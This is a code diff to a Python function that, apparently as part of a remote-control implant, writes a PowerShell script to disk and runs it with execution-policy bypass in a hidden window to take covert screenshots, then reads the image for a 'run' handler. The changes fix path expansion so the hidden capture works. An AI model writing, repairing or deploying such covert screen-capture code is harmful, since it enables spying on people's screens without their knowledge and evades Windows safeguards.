@@ -89,14 +89,14 @@ def run_command(command):
 def screenshottaker():
     #Checks if folder exists or not if not exists creates one
     if not os.path.exists(os.path.expandvars(FOLDER_PATH)):
-        os.makedirs(FOLDER_PATH)
+        os.makedirs(os.path.expandvars(FOLDER_PATH))
     #Checks if script is present or not if not present creates the script
     if not os.path.exists(os.path.expandvars(SCREENSHOT_SCRIPT_PATH)):
         f = open(os.path.expandvars(SCREENSHOT_SCRIPT_PATH), 'w')
         f.write(SCREENSHOT_SCRIPT)
         f.close()
     #Get the screenshot
-    command = f"powershell -ep Bypass -windowstyle hidden .\{SCREENSHOT_SCRIPT_PATH} save-screenshot"
+    command = f"powershell -ep Bypass -windowstyle hidden {os.path.expandvars(SCREENSHOT_SCRIPT_PATH)} save-screenshot"
     run_command(command)
     if os.path.exists(os.path.expandvars(FOLDER_PATH+"\\screenshot.png")):
         return True
@@ -106,6 +106,7 @@ def screenshottaker():
 
 
 def run(options):
+    
     if screenshottaker():
         with open(FOLDER_PATH+"\\screenshot.png",'rb') as f:
             data = f.read()
